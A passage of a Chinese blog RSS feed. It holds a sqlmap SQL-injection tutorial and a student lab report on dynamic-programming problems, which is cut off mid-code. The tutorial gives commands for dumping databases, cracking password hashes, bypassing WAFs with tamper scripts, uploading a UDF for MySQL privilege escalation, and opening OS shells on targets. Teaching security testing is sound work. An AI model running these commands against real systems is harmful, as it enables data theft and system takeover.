<og:description>终于学JavaScript了！ 数组的相关参数 数组 删除第一个元素， 删除最后一个元素，返回的都是删除的元素, 在开头增加一个元素， 在结尾增加元素， 用于删除和修改， 用于切片. 数据类型转换 一</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/sogeisetsu/p/11701632.html</dc:identifier>
</item>
<item>
<title>sqlmap实战-1 - 王宇阳</title>
<link>http://www.cnblogs.com/wangyuyang1016/p/11701609.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wangyuyang1016/p/11701609.html</guid>
<description>&lt;h2 id=&quot;检测和利用sql注入&quot;&gt;检测和利用sql注入&lt;/h2&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;python2 sqlmap.py -u &quot;[URL_SQL注入点]&quot; [--batch]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;--batch&lt;/code&gt;：自动选择sqlmap默认的选择&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;寻找目标&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1512305/201910/1512305-20191019010946935-1922754032.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1512305/201910/1512305-20191019010955061-1473410261.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;直接连接数据库&quot;&gt;直接连接数据库&lt;/h2&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;python2 sqlmap.py -d &quot;mysql://[user]:[password]@[ip]:[port]/[dbs]&quot; --banner --dbs --users&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1512305/201910/1512305-20191019011008330-1435235324.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;数据库操作参数：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--dbs&lt;/code&gt;：列举数据库信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--current-db&lt;/code&gt;：当前数据库名&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--current-user&lt;/code&gt;：当前数据库用户&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--users&lt;/code&gt;：列举DBMS中所有用户&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--passwords&lt;/code&gt;：列举DBMA中所有账户和密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1512305/201910/1512305-20191019011020907-141389327.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-D [databases] …&lt;/code&gt;：指定数据库名,对库进行操作&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-T [tables]&lt;/code&gt;：指定数据表，对表进行操作&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-C [columns]&lt;/code&gt;：指定列名，对列进行操作&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--tables&lt;/code&gt;：列举数据库表的信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--columns&lt;/code&gt;：列举数据表的列名信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--schema&lt;/code&gt;：枚举数据库结构&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--count&lt;/code&gt;：枚举数据包的项目数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-D/-T/-C/--dbs/--tables/--columns/--schema/--count&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;联合操作就可以实现对数据库的具体操作&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;#列举库中的所有表：
-D [库名] --tables
#列举表中的字段名：
-D [库名] -T [表名] --columns&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;--dump&lt;/code&gt;：导出数据&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--start&lt;/code&gt;：指定开始的行&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--stop&lt;/code&gt;：指定结束的行&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;# 导出当前全部的数据表数据
-D [库名] -T [表名] -C [字段名] --count --dump
# 导出部分(范围)数据表数据
-D [库名] -T [表名] -C [字段名] --start {*} --stop {*} --dump&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1512305/201910/1512305-20191019011033592-1893515664.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;sqlmap技巧&quot;&gt;sqlmap技巧&lt;/h2&gt;
&lt;h3 id=&quot;利用注释的方法绕过waf注入&quot;&gt;利用注释的方法绕过waf注入&lt;/h3&gt;
&lt;p&gt;/tamper/halfversionecdmoreckeywords.py:&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;return match.group().replace(word, &quot;/*!0%s&quot; % word)
# 修改
return match.group().replace(word,&quot;/*!50000%s*/&quot; % word)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;/xml/queries.xml:&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;cast query=&quot;CAST(%s AS CHAR)&quot;/&amp;gt;
&amp;lt;!--修改--&amp;gt;
&amp;lt;cast query=&quot;CAST(%s, CHAR)&quot;/&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;sqlmap实施注入：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -u [url] --tamper ./tamper/halfversionecdmoreckeywords.py

sqlmap.py -u [url] --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;url重写sql注入测试&quot;&gt;URL重写SQL注入测试&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;value1&lt;/code&gt;为测试参数，加*符号即可，sqlmap将会测试&lt;code&gt;value1&lt;/code&gt;位置是否可以注入&lt;/p&gt;
&lt;h3 id=&quot;列举并破解密码hash&quot;&gt;列举并破解密码hash&lt;/h3&gt;
&lt;p&gt;当用户可以有权限查看用户密码的时候，&lt;code&gt;--password&lt;/code&gt;会自动连接并破解hash返回结果&lt;/p&gt;
&lt;h3 id=&quot;对目标进行爬取&quot;&gt;对目标进行爬取&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;--batch --crawl=3&lt;/code&gt; 从目标URL爬取网站&lt;/p&gt;
&lt;h3 id=&quot;使用hex规避编码导致丢失&quot;&gt;使用hex规避编码导致丢失&lt;/h3&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -u [url] --banner --hex -v 3 --parse-errors&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;--parse-errors&lt;/code&gt;：解析和显示响应数据库错误信息&lt;/p&gt;
&lt;h3 id=&quot;模仿移动端访问目标&quot;&gt;模仿移动端访问目标&lt;/h3&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -u [url] --banner --mobile
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;--mobile&lt;/code&gt;：设定一个移动端的“User-Agent”模仿手机访问URL&lt;/p&gt;
&lt;h3 id=&quot;智能判断测试&quot;&gt;智能判断测试&lt;/h3&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -u [url] --bath --smart
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;--smart&lt;/code&gt;：快速判断 为报错注入点进行注入&lt;/p&gt;
&lt;h3 id=&quot;结合burp进行注入测试&quot;&gt;结合Burp进行注入测试&lt;/h3&gt;
&lt;p&gt;在Burp——Options——&quot;proxy.Requests&quot;中保存Burp的抓包记录&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -r burp***.txt
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从抓包记录中加载HTTP请求&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -u [url] --data &quot;[*……*]&quot;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;自动填写表单&quot;&gt;自动填写表单&lt;/h3&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -u [url] --forms [……]
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;--forms&lt;/code&gt;：解析和测试目标URL表单&lt;/p&gt;
&lt;h3 id=&quot;读取linux的文件&quot;&gt;读取Linux的文件&lt;/h3&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -u [url] --file [url]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;延时注入&quot;&gt;延时注入&lt;/h3&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -u [url] --technique -T --current-user
sqlmap.py -u [url] --delay 0.5
sqlmap.py -u [url] --safe-freq # 请求两次
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;burp抓包利用sqlmap注入&quot;&gt;Burp抓包利用sqlmap注入&lt;/h3&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -r ***.txt -p [需要注入的参数]
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;-p&lt;/code&gt;：指定注入参数&lt;/p&gt;
&lt;h3 id=&quot;sqlmap-cookies注入&quot;&gt;sqlmap Cookies注入&lt;/h3&gt;
&lt;p&gt;默认情况下，sqlmap只支持get/post参数的注入，使用&lt;code&gt;-level&lt;/code&gt;参数且数值大于等于2就会检测cookie参数，大概大于3时检查User-Agent和Referer&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -u [url] --cookie [value] --level 3
sqlmap.py -u [url] --cookie [value] --level 3 --tables
sqlmap.py -u [url] --cookie [value] --level 3 -T [表名] --coiumns
……
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;mysql提权&quot;&gt;MySQL提权&lt;/h3&gt;
&lt;p&gt;连接并打开一个交互shell&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -d &quot;mysql://[user]:[password]@[ip]:[port]/[dbs]&quot; --sql-shell
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上传lib_mysqludf_sys到plugin目录&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -d &quot;mysql://[user]:[password]@[ip]:[port]/[dbs]&quot;
--file-write=
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;执行shell命令&quot;&gt;执行shell命令&lt;/h3&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sqlmap.py -u [url] --os-cmd=[^] #执行cmd命令（Win环境）
sqlmap.py -u [url] --os-shell=[^] #建立交互式的shell
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Fri, 18 Oct 2019 17:12:00 +0000</pubDate>
<dc:creator>王宇阳</dc:creator>
<og:description>sqlmap实战 1 检测和利用sql注入 ：自动选择sqlmap默认的选择 寻找目标 直接连接数据库 数据库操作参数： ：列举数据库信息 ：当前数据库名 ：当前数据库用户 ：列举DBMS中所有用户</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/wangyuyang1016/p/11701609.html</dc:identifier>
</item>
<item>
<title>『嗨威说』算法设计与分析 - PTA 数字三角形 / 最大子段和 / 编辑距离问题（第三章上机实践报告） - 嗨威er</title>
<link>http://www.cnblogs.com/WinniyGD/p/11699866.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/WinniyGD/p/11699866.html</guid>
<description>&lt;blockquote readability=&quot;35&quot;&gt;
&lt;h2&gt;本文索引目录：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;一、PTA实验报告题1 ： 数字三角形&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　1.1　　实践题目&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　1.2　　问题描述&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　1.3　　算法描述&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　1.4　　算法时间及空间复杂度分析&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;二、PTA实验报告题2 ： 最大子段和&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　2.1　　实践题目&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　2.2　　问题描述&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　2.3　　算法描述&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　2.4　　算法时间及空间复杂度分析&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;三、PTA实验报告题3 ： 编辑距离问题&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　3.1　　实践题目&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　3.2　　问题描述&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　3.3　　算法描述&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　3.4　　算法时间及空间复杂度分析&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;四、实验心得体会（实践收获及疑惑）&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;h2&gt;　　1.1　　实践题目：&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1627981/201910/1627981-20191018163337230-1328118648.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;　　1.2　　问题描述：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　　　　题意是，题干给你一个三角形（实际上就是半个矩形即下三角形模式或上三角形模式），要求你从顶部计算出到底部最佳的路线，使得经过的数字总和最大。&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;　　1.3　　算法描述：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;这道题很明显需要用到动态规划的方法，存在重叠子问题，因此我们需要找出这道题的动态转移方程。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;我们通过模拟可以发现，样例最佳的行走路径是：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1627981/201910/1627981-20191018165047656-1778685659.png&quot; alt=&quot;&quot; width=&quot;521&quot; height=&quot;579&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 很明显发现，我们并不能通过贪心算法来做这道题，只能用动态规划找出最佳路径。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;首先我们需要建立dp数组，定义dp数组的含义为：截至当前位置已走过的数的总和，我们先初始化dp数组。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;要确认当前位置，也就需要定义成二维数组，第一个指定为行，第二个指定为具体列。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1627981/201910/1627981-20191018170025831-1260387509.png&quot; alt=&quot;&quot; width=&quot;563&quot; height=&quot;689&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 第二步，我们需要确定动态方程，很明显我们知道：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;方程为：dp[i][j] = temp[i][j] + max(dp[i+1][j],dp[i+1][j+1])&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;以最后两列为例，模拟动规过程：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1627981/201910/1627981-20191018170349331-2012858139.png&quot; alt=&quot;&quot; width=&quot;587&quot; height=&quot;723&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 可以很明显的发现，当下面两格相比，取出最大值，加上自己本身，就是当前的dp值，依照这个思路&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;我们可以把整个dp过程模拟完成：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1627981/201910/1627981-20191018170722481-2040331798.png&quot; alt=&quot;&quot; width=&quot;628&quot; height=&quot;725&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;到此模拟完成，我们可以很清楚的看到，我们最终想要的答案，就在最顶层，dp[1][1]中，我们只需要固定输出这个值即可得到答案。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;第三步，确认我们的填表顺序，从以上的分析角度可以知道，dp方程中当前dp依赖于当前位置的下一行同列以及下一行同列+1的位置，所以需要从下往上填表，分析完毕，按着这个思路敲出代码即可，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;完整代码展示如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
#include&amp;lt;bits/stdc++.h&amp;gt;
&lt;span&gt;using&lt;/span&gt; &lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; std;
&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; n,temp[&lt;span&gt;105&lt;/span&gt;][&lt;span&gt;105&lt;/span&gt;],ans = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; main()
{
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; input &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    cin&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;n;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;1&lt;/span&gt;;i&amp;lt;=n;i++&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;1&lt;/span&gt;;j&amp;lt;=i;j++&lt;span&gt;)
            cin&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;temp[i][j];
    
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; 动规转移方程： dp[i][j] = temp[i][j] + max(dp[i+1][j],dp[i+1][j+1]);&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        
    &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; down to up &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i = n;i&amp;gt;&lt;span&gt;0&lt;/span&gt;;i--&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;1&lt;/span&gt;;j&amp;lt;=i;j++&lt;span&gt;)
            temp[i][j] &lt;/span&gt;= temp[i][j] + max(temp[i+&lt;span&gt;1&lt;/span&gt;][j],temp[i+&lt;span&gt;1&lt;/span&gt;][j+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;]);

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; answer &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;    
    cout&lt;/span&gt;&amp;lt;&amp;lt;temp[&lt;span&gt;1&lt;/span&gt;][&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];    
 } &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;　　1.4　　算法时间及空间复杂度分析：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　　整体算法上看，动态规划是不计算重复子问题，并优化计算过程，防止计算重复，经过分析可知，我们需要O（n^2）时间初始化dp数组，需要O（1/2 * n^2）的时间进行填表，最后输出，总的来看时间复杂度为O（n^2）。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　　动态规划需要用到辅助空间二维数组进行填表，表的大小根据问题规模确定，因此空间复杂度是O（n^2）。&lt;/span&gt;&lt;/p&gt;



&lt;h2&gt;　　2.1　　实践题目：&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1627981/201910/1627981-20191018171302823-455272784.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;　　2.2　　问题描述：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　　　第二题是动态规划的小小压缩版本，题意是说给一段序列，求怎么取一小段，使得加和数最大，也即最大子段和问题。&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;　　2.3　　算法描述：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　　　首先，分析题目选择相应算法，虽然这章都是在学动态规划，但是在平时拿到题目的时候，我们是不知道这是动态规划的，所以需要分析问题，一般这种求最值问题，常常先考虑贪心能否使用，可以发现这道题是可以使用贪心算法的，所以我也使用贪心算法写了一次，但是呢鉴于题目要求需要O（n）的时间复杂度，因此优先考虑动态规划啦。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 　　　  第二，初始化dp数组，定义dp数组dp[i]为从1到i中最大的子段和。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1627981/201910/1627981-20191018232224656-105547891.png&quot; alt=&quot;&quot; width=&quot;841&quot; height=&quot;225&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 　　　   第三，动态规划转移方程，明显可以知道：dp[ i ] = max( dp[ i-1 ] , k ) ; k 为从0-i的加和大于0的子段，一旦小于0就从当前位置重新计段长。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　　　模拟过程如下：&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1627981/201910/1627981-20191019001359177-499143782.png&quot; alt=&quot;&quot; width=&quot;857&quot; height=&quot;387&quot;/&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt; 　　因此我们就可以很愉快的写出代码啦。AC代码如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
#include&amp;lt;bits/stdc++.h&amp;gt;
&lt;span&gt;using&lt;/span&gt; &lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; std;
&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; n,temp[&lt;span&gt;10005&lt;/span&gt;],dp[&lt;span&gt;10005&lt;/span&gt;],flag = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;,k;
&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; main()
{
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; input &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    cin&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;n;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;1&lt;/span&gt;;i&amp;lt;=n;i++&lt;span&gt;)
    {
        cin&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;temp[i];
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(temp[i] &amp;gt;=&lt;span&gt;0&lt;/span&gt;) flag = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;    dp[i]:1-i中最大子段和
        k: k从0到i加和大于0的子段，遇到子段小于0的扔掉重新开始计长度&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;1&lt;/span&gt;;i&amp;lt;=n;i++&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(k&amp;gt;&lt;span&gt;0&lt;/span&gt;) k +=&lt;span&gt; temp[i];
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; k=&lt;span&gt;temp[i];        
        dp[i] &lt;/span&gt;= max(dp[i-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;], k);
    }
    
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; answer &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt; 
    &lt;span&gt;if&lt;/span&gt;(flag == &lt;span&gt;0&lt;/span&gt;) cout&amp;lt;&amp;lt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; cout&amp;lt;&amp;lt;&lt;span&gt;dp[n];
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;　　2.4　　算法时间及空间复杂度分析：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　　　算法复杂度跟题目要求一致，时间复杂度为O(n)。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　　　空间复杂度需要一个一维数组dp，因此空间复杂度也是O（n）&lt;/span&gt;&lt;/p&gt;



&lt;h2&gt;　　3.1　　实践题目：&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1627981/201910/1627981-20191019003051203-1344855244.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;　　3.2　　问题描述：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　　　该题目为：题目意思是给定两端英文序列，要求将A序列变成B序列，可以通过对A进行删除、插入、更换任意字符，得到B序列，要求以最少步骤为准。&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;　　3.3　　算法描述：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　　　这道题我和三木在写的时候第一次没有写出来，三木想到一个绝佳的数学公式，用最大长度字符串长减去LCS即为所求，但是答案WA在了第三点，后来发现存在特例无法解决，所以课后我又换了一种方式，这里我讲解的还不是很好，在一个博客我看到一个非常完整很棒的讲解，贴出来给大家看看吧：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　https://blog.csdn.net/weixin_42681158/article/details/89411572&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　我的AC代码如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
#include&amp;lt;bits/stdc++.h&amp;gt;
&lt;span&gt;using&lt;/span&gt; &lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; std;
&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; dp[&lt;span&gt;2005&lt;/span&gt;][&lt;span&gt;2005&lt;/span&gt;&lt;span&gt;];
&lt;/span&gt;&lt;span&gt;char&lt;/span&gt; a[&lt;span&gt;2005&lt;/span&gt;&lt;span&gt;];
&lt;/span&gt;&lt;span&gt;char&lt;/span&gt; b[&lt;span&gt;2005&lt;/span&gt;&lt;span&gt;];
&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; minval(&lt;span&gt;int&lt;/span&gt; a,&lt;span&gt;int&lt;/span&gt; b,&lt;span&gt;int&lt;/span&gt;&lt;span&gt; c){
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; temp =&lt;span&gt; max(a,b);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; max(temp,c);
}
&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; LCS(&lt;span&gt;char&lt;/span&gt; *a,&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;b)
{
    memset(dp,&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;sizeof&lt;/span&gt;&lt;span&gt;(dp));
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; lena=&lt;span&gt;strlen(a);
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; lenb=&lt;span&gt;strlen(b);
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=&lt;span&gt;1&lt;/span&gt;;i&amp;lt;=lena;i++&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; j=&lt;span&gt;1&lt;/span&gt;;j&amp;lt;=lenb;j++&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(a[i-&lt;span&gt;1&lt;/span&gt;]==b[j-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;])
                dp[i][j]&lt;/span&gt;=minval(dp[i-&lt;span&gt;1&lt;/span&gt;][j],dp[i][j-&lt;span&gt;1&lt;/span&gt;],dp[i-&lt;span&gt;1&lt;/span&gt;][j-&lt;span&gt;1&lt;/span&gt;]+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
